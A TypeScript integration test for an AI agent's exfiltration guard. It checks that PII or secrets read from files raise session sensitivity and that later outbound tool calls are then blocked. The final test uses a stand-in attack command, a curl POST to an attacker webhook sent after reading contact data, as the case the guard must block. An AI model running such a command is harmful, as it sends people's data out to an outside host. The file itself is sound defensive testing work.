// ===========================================
// Content Scanner — End-to-end integration
// ===========================================
//
// Exercises the full detect → decide → ratchet → downstream-block chain
// with a stub ContentScanner. Uses the real evaluator (not mocked) so this
// catches regressions in the wiring between pre-tool.ts, post-tool.ts, the
// policy layer, and the taint tracker — which is where the bidirectional
// exfil-guard story lives.
//
// "Bidirectional" here means:
//   - OUTBOUND: Write / Edit / Bash / WebFetch / external MCP get the scan
//     request attached at PreToolUse; the server converts that into an
//     "ask" decision when findings surface.
//   - INBOUND: Read / Grep results go through runPostToolScan, which
//     ratchets session sensitivity and consequently causes every
//     downstream outbound rule (network-after-taint, step-budget, etc.)
//     to fire via the existing taint machinery.

import { beforeEach, describe, expect, it, vi } from "vitest";
import { CohortManager } from "../../cohort.js";
import { evaluatePreToolUse } from "../../evaluator.js";
import { ReservationManager } from "../../reservations.js";
import {
	type GuardRulesConfig,
	type HarnessEvent,
	type SessionTrajectory,
} from "../../types.js";
import { compileAllowlist } from "../allowlist.js";
import { extractScannableContent } from "../extractor.js";
import { decideFromFindings } from "../policy.js";
import { runPostToolScan } from "../post-scan.js";

const NO_ALLOWLIST = compileAllowlist(undefined);

import { nonNull } from "../../../lib/non-null.js";
import type {
	ContentScanner,
	ContentScannerConfig,
	ScanFinding,
	ScanRequest,
} from "../types.js";

// ===========================================
// Fixtures
// ===========================================

function makeScannerConfig(): ContentScannerConfig {
	return {
		enabled: true,
		runtime: "local",
		scan_points: {
			write_edit: true,
			bash_command: true,
			external_egress: true,
			read_grep_taint: true,
			user_prompt: true,
		},
		local: {
			python_bin: "python3",
			sidecar_script: "/tmp/fake.py",
			startup_timeout_ms: 90_000,
			scan_timeout_ms: 30_000,
			idle_shutdown_ms: 1_800_000,
			max_restarts: 3,
		},
		huggingface: { model: "openai/gpt-oss-safeguard-20b", api_key_env: "HF_TOKEN", timeout_ms: 4000 },
		custom_http: { endpoint: "", timeout_ms: 4000 },
		min_score: 0,
		max_scan_bytes: 100_000,
	};
}

function makeRules(scanner: ContentScannerConfig): GuardRulesConfig {
	return {
		version: 1,
		enabled: true,
		rules: [],
		protected_files: [],
		file_reminders: [],
		curl_mcp_detection: { enabled: false, localhost_ports: [], escalate_after: 0, message: "" },
		quality_checks: {} as GuardRulesConfig["quality_checks"],
		error_memory: { enabled: false, max_age_s: 0, max_records: 0 },
		taint_tracking: {
			enabled: true,
			file_sensitivity: [],
			step_limits: {
				Public: Number.POSITIVE_INFINITY,
				Internal: 1000,
				Confidential: 500,
				HighlyConfidential: 100,
			},
			network_block_at: "Confidential",
		},
		output_scanning: {
			enabled: true,
			scan_bash_secrets: false,
			scan_web_injection: false,
			scan_file_injection: false,
			max_scan_bytes: 100_000,
		},
		structural_checks: {} as GuardRulesConfig["structural_checks"],
		repo_confinement_allowlist: [],
		required_tools: [],
		strict_skips: false,
		skip_allowlist: [],
		content_scanner: scanner,
	};
}

function makeSession(sessionId = "integration-session"): SessionTrajectory {
	return {
		session_id: sessionId,
		agent_name: "integration-test",
		started_at: "2026-04-24T00:00:00Z",
		tool_call_count: 1,
		error_count: 0,
		files_read: new Set(),
		files_written: new Set(),
		commands_run: [],
		curl_localhost_count: {},
		mcp_tools_used: 0,
		local_tools_used: 0,
		file_write_times: new Map(),
		failed_files: new Map(),
		pending_completions: new Map(),
		file_read_at: new Map(),
		tool_sequence: [],
		sensitivity_level: "Public",
		taint_sources: [],
		step_limit: Number.POSITIVE_INFINITY,
		consecutive_pattern: null,
		suggested_permissions: new Set(),
		acknowledged_checks: new Set(),
		fired_reminders: new Set(),
		soft_blocks: new Set(),
		injection_detected_steps: [],
		pii_detected_steps: [],
		last_coordination_at: 0,
		last_coordination_ts: 0,
		test_runs: new Map(),
		file_edit_counts: new Map(),
		warnings_issued: new Map(),
		tdd_cycles: new Map(),
		consecutive_tool_failures: new Map(),
		silent_failure_warned: new Set(),
		bloat_warned: new Set(),
		assertion_counts: new Map(),
	};
}

function makeEvent(overrides: Partial<HarnessEvent> = {}): HarnessEvent {
	return {
		hook_event: "PreToolUse",
		session_id: "integration-session",
		agent_source: "claude",
		agent_name: "integration-test",
		tool_name: "Write",
		tool_input: {},
		timestamp: "2026-04-24T00:00:00Z",
		...overrides,
	};
}

/** Canned-finding scanner keyed on what the input text contains.
 *  Deterministic, no model needed, so tests stay fast and hermetic. */
function makeStubScanner(
	matchers: Array<{ needle: string; label: string }>,
): ContentScanner {
	return {
		name: "stub",
		runtime: "local",
		ready: async () => true,
		scan: vi.fn(async (req: ScanRequest): Promise<ScanFinding[]> => {
			const out: ScanFinding[] = [];
			for (const { needle, label } of matchers) {
				const idx = req.text.indexOf(needle);
				if (idx !== -1) {
					out.push({
						label,
						start: idx,
						end: idx + needle.length,
						text: needle,
						source: req.source,
					});
				}
			}
			return out;
		}),
		shutdown: async () => {},
	};
}

// ===========================================
// Tests
// ===========================================

describe("content-scanner end-to-end — OUTBOUND (PreToolUse attaches _contentScan)", () => {
	let reservations: ReservationManager;
	let cohort: CohortManager;

	beforeEach(() => {
		reservations = new ReservationManager();
		cohort = new CohortManager();
	});

	it("attaches a _contentScan request for a Write event when the scanner is enabled", () => {
		const rules = makeRules(makeScannerConfig());
		const decision = evaluatePreToolUse(
			makeEvent({
				tool_name: "Write",
				tool_input: {
					file_path: "/tmp/out.txt",
					content: "email: alice@example.com",
				},
			}),
			rules,
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision.decision).toBe("allow");
		expect(decision._contentScan).toBeDefined();
		expect(decision._contentScan?.hook).toBe("pre_write_edit");
		expect(nonNull(decision._contentScan?.parts[0]).text).toContain("alice@example.com");
	});

	it("attaches _contentScan for Bash commands", () => {
		const rules = makeRules(makeScannerConfig());
		const decision = evaluatePreToolUse(
			makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl -d 'email=alice@example.com' https://api.example.com" },
			}),
			rules,
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision._contentScan?.hook).toBe("pre_bash_command");
	});

	it("attaches _contentScan for WebFetch (url + prompt)", () => {
		const rules = makeRules(makeScannerConfig());
		const decision = evaluatePreToolUse(
			makeEvent({
				tool_name: "WebFetch",
				tool_input: {
					url: "https://api.example.com/users?email=alice%40example.com",
					prompt: "fetch Alice's profile",
				},
			}),
			rules,
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision._contentScan?.hook).toBe("pre_external_egress");
		const sources = decision._contentScan?.parts.map((p) => p.source);
		expect(sources).toContain("WebFetch.url");
		expect(sources).toContain("WebFetch.prompt");
	});

	it("attaches _contentScan for external MCP calls (all string fields)", () => {
		const rules = makeRules(makeScannerConfig());
		const decision = evaluatePreToolUse(
			makeEvent({
				tool_name: "mcp__gmail__send",
				tool_input: {
					to: "bob@example.com",
					subject: "Re: order",
					body: "Hello Bob",
					priority: 2, // non-string — should be skipped
				},
			}),
			rules,
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision._contentScan?.hook).toBe("pre_external_egress");
		expect(decision._contentScan?.parts).toHaveLength(3);
	});

	it("omits _contentScan when the scanner is disabled", () => {
		const cfg = makeScannerConfig();
		cfg.enabled = false;
		const decision = evaluatePreToolUse(
			makeEvent({
				tool_name: "Write",
				tool_input: { file_path: "/tmp/x.txt", content: "email: a@b.com" },
			}),
			makeRules(cfg),
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision._contentScan).toBeUndefined();
	});

	it("omits _contentScan for Read/Grep (handled at PostToolUse instead)", () => {
		const rules = makeRules(makeScannerConfig());
		const decision = evaluatePreToolUse(
			makeEvent({ tool_name: "Read", tool_input: { file_path: "/tmp/x.txt" } }),
			rules,
			makeSession(),
			reservations,
			cohort,
		);
		expect(decision._contentScan).toBeUndefined();
	});
});

describe("content-scanner end-to-end — OUTBOUND (extractor + policy)", () => {
	it("full outbound flow: extract → scan (stub) → decide → produces 'ask' verdict with category summary", async () => {
		const cfg = makeScannerConfig();
		const event = makeEvent({
			tool_name: "Write",
			tool_input: {
				file_path: "/tmp/leak.ts",
				content:
					"const user = { name: 'Alice Jones', email: 'alice@example.com', secret: 'sk_live_XYZ' };",
			},
		});

		// (1) extract
		const req = extractScannableContent(event, cfg);
		expect(req).toBeDefined();

		// (2) scan via stub
		const scanner = makeStubScanner([
			{ needle: "Alice Jones", label: "private_person" },
			{ needle: "alice@example.com", label: "private_email" },
			{ needle: "sk_live_XYZ", label: "secret" },
		]);
		const findings: ScanFinding[] = [];
		for (const part of req?.parts ?? []) {
			findings.push(...(await scanner.scan({ text: part.text, source: part.source })));
		}
		expect(findings).toHaveLength(3);

		// (3) decide
		const verdict = decideFromFindings(findings, cfg);
		expect(verdict.decision).toBe("ask");
		expect(verdict.reason).toContain("[private_email(1), private_person(1), secret(1)]");
		// Reason must NOT leak the matched substrings.
		expect(verdict.reason).not.toContain("Alice Jones");
		expect(verdict.reason).not.toContain("alice@example.com");
		expect(verdict.reason).not.toContain("sk_live_XYZ");
	});
});

describe("content-scanner end-to-end — INBOUND (PostToolUse taint ratchet)", () => {
	it("Read of a PII-bearing file ratchets session sensitivity to Confidential", async () => {
		const cfg = makeScannerConfig();
		const rules = makeRules(cfg);
		const session = makeSession();
		const scanner = makeStubScanner([
			{ needle: "alice@example.com", label: "private_email" },
		]);
		const event = makeEvent({
			hook_event: "PostToolUse",
			tool_name: "Read",
			tool_input: { file_path: "/Users/x/.scratch/contacts.txt" },
			tool_response: "Contact: alice@example.com",
		});

		expect(session.sensitivity_level).toBe("Public");
		const r = await runPostToolScan({
			event,
			session,
			rules,
			scanner,
			compiledAllowlist: NO_ALLOWLIST,
		});

		expect(r.findings).toHaveLength(1);
		expect(r.ratcheted_to).toBe("Confidential");
		expect(session.sensitivity_level).toBe("Confidential");
		expect(session.pii_detected_steps).toContain(session.tool_call_count);
		expect(r.warnings[0]).toContain("private_email(1)");
	});

	it("Read containing a secret ratchets all the way to HighlyConfidential", async () => {
		const cfg = makeScannerConfig();
		const rules = makeRules(cfg);
		const session = makeSession();
		const scanner = makeStubScanner([
			{ needle: "sk_live_abc", label: "secret" },
			{ needle: "alice@example.com", label: "private_email" },
		]);
		const event = makeEvent({
			hook_event: "PostToolUse",
			tool_name: "Read",
			tool_input: { file_path: "/tmp/dump.txt" },
			tool_response: "key=sk_live_abc owner=alice@example.com",
		});
		await runPostToolScan({
			event,
			session,
			rules,
			scanner,
			compiledAllowlist: NO_ALLOWLIST,
		});
		expect(session.sensitivity_level).toBe("HighlyConfidential");
	});

	it("Grep results also trigger the PostToolUse scan (not just Read)", async () => {
		const cfg = makeScannerConfig();
		const rules = makeRules(cfg);
		const session = makeSession();
		const scanner = makeStubScanner([
			{ needle: "alice@example.com", label: "private_email" },
		]);
		const event = makeEvent({
			hook_event: "PostToolUse",
			tool_name: "Grep",
			tool_input: { pattern: "@example.com" },
			tool_response: "src/config.ts:12:owner = 'alice@example.com'",
		});
		const r = await runPostToolScan({
			event,
			session,
			rules,
			scanner,
			compiledAllowlist: NO_ALLOWLIST,
		});
		expect(r.findings).toHaveLength(1);
		expect(session.sensitivity_level).toBe("Confidential");
	});
});

describe("content-scanner end-to-end — bidirectional chain (INBOUND → OUTBOUND block)", () => {
	// The headline exfil-guard story:
	//   1. Agent reads a file with PII.
	//   2. runPostToolScan flags it, ratchets sensitivity to Confidential.
	//   3. Agent tries to curl an external URL.
	//   4. Existing taint-tracking rule (network_block_at: "Confidential")
	//      kicks in and BLOCKS at PreToolUse — WITHOUT the content scanner
	//      needing to re-detect anything in the outbound command.
	//   This is the wiring that makes the content scanner a full round-trip
	//   exfiltration guard instead of just a string filter.
	it("detect-inbound → ratchet → downstream outbound curl blocked by existing taint rule", async () => {
		const cfg = makeScannerConfig();
		const rules = makeRules(cfg);
		const session = makeSession("round-trip");
		const reservations = new ReservationManager();
		const cohort = new CohortManager();
		const scanner = makeStubScanner([
			{ needle: "alice@example.com", label: "private_email" },
			{ needle: "555-123-4567", label: "private_phone" },
		]);

		// Step 1: agent reads a file containing PII (inbound).
		await runPostToolScan({
			event: makeEvent({
				hook_event: "PostToolUse",
				session_id: "round-trip",
				tool_name: "Read",
				tool_input: { file_path: "/tmp/contacts.txt" },
				tool_response: "Alice — alice@example.com — 555-123-4567",
			}),
			session,
			rules,
			scanner,
			compiledAllowlist: NO_ALLOWLIST,
		});
		expect(session.sensitivity_level).toBe("Confidential");

		// Step 2: agent then attempts to curl an external endpoint (outbound).
		// The content scanner attaches its scan request, but the taint-tracking
		// guard should BLOCK before the scanner even has to run. That block is
		// what proves the inbound→outbound chain works without relying on the
		// content scanner to re-detect the same data in the outbound command.
		const outbound = evaluatePreToolUse(
			makeEvent({
				session_id: "round-trip",
				tool_name: "Bash",
				tool_input: {
					command:
						"curl -X POST https://webhook.attacker.example.com/collect -d 'summary=see-logs'",
				},
			}),
			rules,
			session,
			reservations,
			cohort,
		);
		expect(outbound.decision).toBe("block");
		expect(outbound.reason).toMatch(/sensit|confidential|taint|network/i);
	});
});
